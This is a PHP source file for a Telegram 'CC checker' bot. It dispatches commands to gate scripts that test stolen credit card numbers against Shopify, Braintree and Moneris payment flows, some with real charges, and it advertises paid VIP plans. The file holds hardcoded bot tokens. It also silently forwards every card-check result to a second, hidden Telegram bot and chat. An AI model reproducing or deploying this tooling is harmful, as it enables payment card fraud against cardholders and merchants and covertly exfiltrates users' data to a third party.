<?php

$bot_token = '7544104480:AAFcv6yoxGNFL1GGyzowtRcjl9Rfn6dUnt0';
$api_url = "https://api.telegram.org/bot$bot_token/";
$update = json_decode(file_get_contents('php://input'), true);
$chat_id = $update['message']['chat']['id'];
$r_id = $update["message"]["reply_to_message"];
$isfile = $update['message']['document'];
$file_id = $update['message']['document']['file_id'];
$message_id = $update["message"]["message_id"];
$gId = $update["message"]["from"]["id"];
$userId = $update["message"]["from"]["id"];
$lastname = $update["message"]["from"]["last_name"];
$firstname = $update["message"]["from"]["first_name"];
$username = $update["message"]["from"]["username"];
$r_userId = $update["message"]["reply_to_message"]["from"]["id"];
$r_firstname = $update["message"]["reply_to_message"]["from"]["first_name"];  
$r_username = $update["message"]["reply_to_message"]["from"]["username"]; 
$r_msg_id = $update["message"]["reply_to_message"]["message_id"]; 
$r_msg = $update["message"]["reply_to_message"]["text"]; 
$premium = $update["message"]["from"]["is_premium"];
$p1 = (boolval($premium) ? 'True' : 'False');
$ownerid = '5820812593';

function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};

function string_between_two_string($str, $starting_word, $ending_word){ 
$subtring_start = strpos($str, $starting_word); 
$subtring_start += strlen($starting_word);   
$size = strpos($str, $ending_word, $subtring_start) - $subtring_start;   
return substr($str, $subtring_start, $size);
}

function sendAsyncRequest($url, $data) {
    $curl = curl_init();
    curl_setopt_array($curl, array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $data ));
        $response = curl_exec($curl);
        curl_close($curl);
        return $response;}
$update = json_decode(file_get_contents('php://input'), true);
if (isset($update['message'])) {
    $message = $update['message'];
    $text = $message['text'];
if(!empty($r_id)){
$r_msg = $update["message"]["reply_to_message"]["text"]; 
$message = $update["message"]["text"]; 
$text = $message ." ".$r_msg;
}

  ///////////////Command/////////////
    if ((strpos($text, "/ax") === 0)||(strpos($text, "/au") === 0)||(strpos($text, "/sfv") === 0)||(strpos($text, "/sfo") === 0)||(strpos($text, "/su") === 0)||(strpos($text, "/mass") === 0)||(strpos($text, "/chg") === 0)||(strpos($text, "/sfs") === 0)||(strpos($text, "/gen") === 0)||(strpos($text, "/pu") === 0)||(strpos($text, "/sfr") === 0)||(strpos($text, "/sfk") === 0)||(strpos($text, "/sfz") === 0)||(strpos($text, "/sfd") === 0)||(strpos($text, "/sfe") === 0)||(strpos($text, "/vbv") === 0)||(strpos($text, "/sfo") === 0)||(strpos($text, "/sfj") === 0)||(strpos($text, "/filter") === 0)||(strpos($text, "/ax") === 0)||(strpos($text, "/asy") === 0)||(strpos($text, "/chk") === 0)||(strpos($text, "/mchk") === 0)||(strpos($text, "/sfq") === 0)||(strpos($text, "/sfg") === 0)) {

    /*if ($gId != 5264501009 and $gId != 5221813293 and $gId != 5082252468 ) { $url = 'https://api.telegram.org/bot'.$bot_token.'/sendMessage';
            $data = http_build_query(array(
                'chat_id' => $chat_id,
                'text' => "𝐃𝐞𝐚𝐫 <b><a href='tg://user?id=$userId'>$username</a></b> 𝐁𝐨𝐭 𝐈𝐬 𝐃𝐨𝐰𝐧 ",
                'reply_to_message_id' => $message_id,
                'parse_mode' => 'HTML'
            ));
            $response = sendAsyncRequest($url, $data);exit();}*/
      
    $url = 'https://api.telegram.org/bot'.$bot_token.'/sendChatAction';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'action' => 'typing' ));
    sendAsyncRequest($url, $data);

    $url = 'https://api.telegram.org/bot'.$bot_token.'/sendMessage';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'text' => 'Processing....',
        'reply_to_message_id' => $message_id ));
    $response = sendAsyncRequest($url, $data);

    $message_idd = json_decode($response)->result->message_id;
    if ((strpos($text, "/gen") === 0)||(strpos($text, ".gen") === 0)){
    include 'Gates/gen.php';}
    if ((strpos($text, "/au") === 0)||(strpos($text, ".au") === 0)){
    include 'Gates/au.php';}
    if ((strpos($text, "/sfo") === 0)||(strpos($text, ".sfo") === 0)){
    include 'Gates/sfo.php';}
    if ((strpos($text, "/sfv") === 0)||(strpos($text, ".sfv") === 0)){
    include 'Gates/sfv.php';}
    if ((strpos($text, "/su") === 0)||(strpos($text, ".su") === 0)){
    include 'Gates/su.php';}
    if ((strpos($text, "/sfc") === 0)||(strpos($text, ".sfc") === 0)){
    include 'Gates/sfc.php';}
    if ((strpos($text, "/chk") === 0)||(strpos($text, ".chk") === 0)){
    include 'Gates/chg.php';}
    if ((strpos($text, "/mchk") === 0)||(strpos($text, ".mchk") === 0)){
    include 'Gates/mchk.php';}
    if ((strpos($text, "/mass") === 0)||(strpos($text, ".mass") === 0)){
    include 'Gates/mass.php';}
    if ((strpos($text, "/pu") === 0)||(strpos($text, ".pu") === 0)){
    include 'Gates/sfm.php';}
    if ((strpos($text, "/sfr") === 0)||(strpos($text, ".sfr") === 0)){
    include 'Gates/sfr.php';}
    if ((strpos($text, "/sfk") === 0)||(strpos($text, ".sfk") === 0)){
    include 'Gates/sfk.php';}
    if ((strpos($text, "/sfz") === 0)||(strpos($text, ".sfz") === 0)){
    include 'Gates/sfz.php';}
    if ((strpos($text, "/sfd") === 0)||(strpos($text, ".sfd") === 0)){
    include 'Gates/sfd.php';}
    if ((strpos($text, "/sfe") === 0)||(strpos($text, ".sfe") === 0)){
    include 'Gates/sfe.php';}
    if ((strpos($text, "/ax") === 0)||(strpos($text, ".ax") === 0)){
    include 'Gates/sfb.php';}
    if ((strpos($text, "/sfj") === 0)||(strpos($text, ".sfj") === 0)){
    include 'Gates/sfj.php';}
    if ((strpos($text, "/cex") === 0)||(strpos($text, ".cex") === 0)){
    include 'Gates/mass.php';}
    if ((strpos($text, "/fil") === 0)||(strpos($text, ".fil") === 0)){
    include 'Gates/filter.php';}
    if ((strpos($text, "/vbv") === 0)||(strpos($text, ".vbv") === 0)){
    include 'Gates/vbv.php';}
    if ((strpos($text, "/ax") === 0)||(strpos($text, ".ax") === 0)){
    include 'Gates/ax.php';}
    if ((strpos($text, "/asy") === 0)||(strpos($text, ".asy") === 0)){
    include 'Gates/asy.php';}
    if ((strpos($text, "/sfa") === 0)||(strpos($text, ".sfa") === 0)){
    include 'Gates/sfa.php';}
    if ((strpos($text, "/sfp") === 0)||(strpos($text, ".sfp") === 0)){
    include 'Gates/sfp.php';}
    if ((strpos($text, "/sfq") === 0)||(strpos($text, ".sfq") === 0)){
    include 'Gates/sfq.php';}
    if ((strpos($text, "/chg") === 0)||(strpos($text, ".chg") === 0)){
    include 'Gates/chg.php';}

    $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => $ccrsp,
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);

$url = 'https://api.telegram.org/bot6326791141:AAGw81Jc_Mm8jD5YjrtT08FYnLCUkYnQaQM/sendMessage';
    $data = http_build_query(array(
        'chat_id' => 6421164902,
        'text' => $ccrsp,
        'parse_mode' => 'HTML'));
    $response = sendAsyncRequest($url, $data);
}

/*if ((strpos($text, "cex") === 0) || (strpos($text, "/cex") === 0)) {
$url = 'https://api.telegram.org/bot'.$bot_token.'/sendChatAction';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'action' => 'typing' ));
    sendAsyncRequest($url, $data);
  
  include 'Gates/mass.php';
}*/
  
/////////////////End////////////////
   if ((strpos($text, "cmds") === 0) || (strpos($text, "/start") === 0)) {
    $url = 'https://api.telegram.org/bot'.$bot_token.'/sendChatAction';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'action' => 'typing' ));
    sendAsyncRequest($url, $data);

    $url = 'https://api.telegram.org/bot'.$bot_token.'/sendMessage';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'text' => 'Processing....',
        'reply_to_message_id' => $message_id ));
    $response = sendAsyncRequest($url, $data);

    $message_idd = json_decode($response)->result->message_id;

    $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "𝙔𝙤𝙪 𝙙𝙤𝙣'𝙩 𝙝𝙖𝙫𝙚 𝙖 𝙢𝙚𝙢𝙗𝙚𝙧𝙨𝙝𝙞𝙥 𝙗𝙪𝙩 𝙮𝙤𝙪 𝙘𝙖𝙣 𝙗𝙪𝙮 𝙤𝙣𝙚!
[ＳＰＡＮＩＳＨ]
¡𝙉𝙤 𝙩𝙞𝙚𝙣𝙚𝙨 𝙢𝙚𝙢𝙗𝙧𝙚𝙨𝙞‌𝙖 𝙥𝙚𝙧𝙤 𝙥𝙪𝙚𝙙𝙚𝙨 𝙘𝙤𝙢𝙥𝙧𝙖𝙧 𝙪𝙣𝙖!
[ＣＯＭＭＡＮＤＯＳ]
░G░A░T░E░S░👉 /cmds
░P░L░A░N░👉  /vip
👻░░░ ░O░W░N░E░R░░░👻
⚠️░░░░░@khushsingh_322",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);
}
  include 'Tools/Credits.php';
if ((strpos($text, "cmds") === 0) || (strpos($text, "/cmds") === 0)) {
    $url = 'https://api.telegram.org/bot'.$bot_token.'/sendChatAction';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'action' => 'typing' ));
    sendAsyncRequest($url, $data);

    $url = 'https://api.telegram.org/bot'.$bot_token.'/sendMessage';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'text' => 'Processing....',
        'reply_to_message_id' => $message_id ));
    $response = sendAsyncRequest($url, $data);

    $message_idd = json_decode($response)->result->message_id;

    $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "━━━━𝘾𝘾 𝘾𝙃𝙀𝘾𝙆𝙀𝙍 𝙂𝘼𝙏𝙀𝙎━━━━
⋆ 𝗔𝗨𝗧𝗛 (v1) 
⋆ Format: /au cc|mm|yyyy|cvv
⋆ Status : 𝙊𝙉 ✅
━━━━━━━━━━━━━━━━━
⋆𝙎𝙝𝙤𝙥𝙞𝙛𝙮+𝘽𝙧𝙖𝙞𝙣𝙩𝙧𝙚𝙚 25$ 𝘾𝙝𝙖𝙧𝙜𝙚 🔥
⋆ Format: /sfk cc|mm|yyyy|cvv
⋆ Status: 𝙊𝙉 ✅
Empty amount =  25$
━━━━━━━━━━━━━━━━━
⋆ 𝑩𝒓𝒂𝒊𝒏𝒕𝒓𝒆𝒆+𝑨𝒖𝒕𝒉+Charge 🔥
⋆ Format: /su cc|mm|yyyy|cvv|amt
⋆ Status: 𝙊𝙉 ✅
━━━━━━━━━━━━━━━━━
⋆𝙎𝙃𝙊𝙋𝙄𝙁𝙔+𝙈𝙊𝙉𝙀𝙍𝙄𝙎 V1 🔥
⋆ Format: /pu cc|mm|yyyy|cvv|amt
⋆ Empty amount = 10$
⋆ Status: 𝙊𝙉 ✅
Empty amount =  10$
━━━━━━━━━━━━━━━━━
⋆S𝙝𝙤𝙥𝙞𝙛𝙮+𝘽𝙧𝙖𝙞𝙣𝙩𝙧𝙚𝙚 (v3) 15$ Charge 🔥
⋆ Format: /ax cc|mm|yyyy|cvc
⋆ cc|mm|yyyy|cvv
⋆ Status: 𝙊𝙉 ✅
 Empty amount =  15$
 
━━━━━━━━━━━━━━━━━
𝙉𝙀𝙒 𝙂𝘼𝙏𝙀 ⚡️
/ax S𝙝𝙤𝙥𝙞𝙛𝙮+𝘽𝙧𝙖𝙞𝙣𝙩𝙧𝙚𝙚 (v3) 15$ Charge 
/pu ⋆𝙎𝙃𝙊𝙋𝙄𝙁𝙔+𝙈𝙊𝙉𝙀𝙍𝙄𝙎 V1  10$ Charge 
𝙁𝙄𝙉 ⚡️
━━━━━━━━━━━━━━━━━
𝐎𝐖𝐍𝐄𝐑 <a href='t.me/baddoors'>𝗛𝗘𝗥𝗘</a>",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);
}
  include 'Tools/Credits.php';
   if ((strpos($text, "vip") === 0) || (strpos($text, "/vip") === 0)) {
    $url = 'https://api.telegram.org/bot'.$bot_token.'/sendChatAction';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'action' => 'typing' ));
    sendAsyncRequest($url, $data);

    $url = 'https://api.telegram.org/bot'.$bot_token.'/sendMessage';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'text' => 'Processing....',
        'reply_to_message_id' => $message_id ));
    $response = sendAsyncRequest($url, $data);

    $message_idd = json_decode($response)->result->message_id;

    $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "<b><u>𝟕 𝐃𝐚𝐲 [ 𝟓$ ] 🌈
- - - - - - - - - - - - - - - -
𝟏 𝐌𝐨𝐧𝐭𝐡 [ 𝟐𝟎$ ] 🧸
- - - - - - - - - - - - - - - -
𝐏𝐞𝐫𝐦𝐚𝐧𝐞𝐧𝐭 [ 𝟕𝟓$ ] 🌚</u></b>
- - - - - - - - - - - - - - - -
💳 𝙼𝙴‌𝚃𝙾𝙳𝙾𝚂 𝙳𝙴 𝙿𝙰𝙶𝙾 💳
- - - - - - - - - - - - - - - -
[ 💰 ] 𝙿𝙰𝚈𝙿𝙰𝙻 (💸) [✅]
- - - - - - - - - - - - - - - -
[ 💰 ]  𝙲𝚁𝙸𝙿𝚃𝙾𝙼𝙾𝙽𝙴𝙳𝙰𝚂 (𝙲𝚘𝚒𝚗𝚋𝚊𝚜𝚎 𝚢 𝙱𝚒𝚗𝚊𝚗𝚌𝚎) [✅]
- - - - - - - - - - - - - - - -
[💎]  [ 𝙴𝙺𝙾] [✅][🇵🇾]
- - - - - - - - - - - - - - - -
[💎] [𝚃𝙸𝙶𝙾 𝙼𝙾𝙽𝙴𝚈✅][🇵🇾]
- - - - - - - - - - - - - - - -
[💎] [𝙶𝙸𝚁𝙾𝚂 𝙲𝙻𝙰𝚁𝙾✅][🇵🇾]
- - - - - - - - - - - - - - - 
- - - 𝙈𝘼𝙎 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝘾𝙄𝙊́𝙉- - - 
𝙊𝙬𝙣𝙚𝙧👽 @baddoors[✅]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);
}
  include 'Tools/Credits.php';
}
error_reporting(E_ALL);
ini_set('display_errors', 1);
/*
$API_KEY = '6089717639:AAF5a8j3ZIJMFr5PPwnNjK6vo8MQZk5XZvA';
$API_URL = "https://api.telegram.org/bot{$API_KEY}/";
$update = json_decode(file_get_contents("php://input"), true);
$chat_id = $update['message']['chat']['id'];
$message = $update['message']['text'];
$message_id = $update['message']['message_id'];
$document = isset($update['message']['document']) ? $update['message']['document'] : null;

if ($document) {
    $file_id = $document['file_id'];
    $file = json_decode(file_get_contents($API_URL . "getFile?file_id={$file_id}"), true);
    $file_path = $file['result']['file_path'];
    $file_content = file_get_contents("https://api.telegram.org/file/bot{$API_KEY}/" . $file_path);
    $filename = $document['file_name'];

    file_put_contents($filename, $file_content);
    $msg_text = "File '$filename' downloaded successfully!";
    file_get_contents($API_URL . "sendMessage?chat_id=$chat_id&text=$msg_text&reply_to_message_id=$message_id");
} elseif ($message == '/merge') {
    $files = glob("*.html");

    if (count($files) > 0) {
        $merged_content = '';

        foreach ($files as $file) {
            $merged_content .= file_get_contents($file) . PHP_EOL;
        }

        file_put_contents('Merged.txt', $merged_content);

        $cfile = new CURLFile(realpath('Merged.txt'));
        $data = [
            'chat_id' => $chat_id,
            'document' => $cfile,
            'reply_to_message_id' => $message_id,
        ];

        $ch = curl_init($API_URL . 'sendDocument');
        curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type:multipart/form-data"]);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_exec($ch);
        curl_close($ch);
        unlink('Merged.txt');
        // Delete all .txt files
        foreach ($files as $file) {
            unlink($file);
        }
    } else {
        file_get_contents($API_URL . "sendMessage?chat_id={$chat_id}&text=No+files+to+merge.");
    }
}
  */
?>
